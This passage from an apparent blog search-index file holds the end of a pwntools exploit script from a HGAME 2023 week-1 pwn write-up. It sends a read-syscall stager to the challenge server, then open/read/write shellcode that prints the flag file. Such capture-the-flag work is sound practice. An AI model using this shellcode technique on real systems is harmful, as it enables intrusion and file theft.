string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-1.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">31651</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''xor edi,edimov rsi,0xCAFE0000syscall'''</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">14</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xCAFE0500</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xCAFE0500</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/01/13/2023hgame-week1/2023hgame-week1/1.jpg" class>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
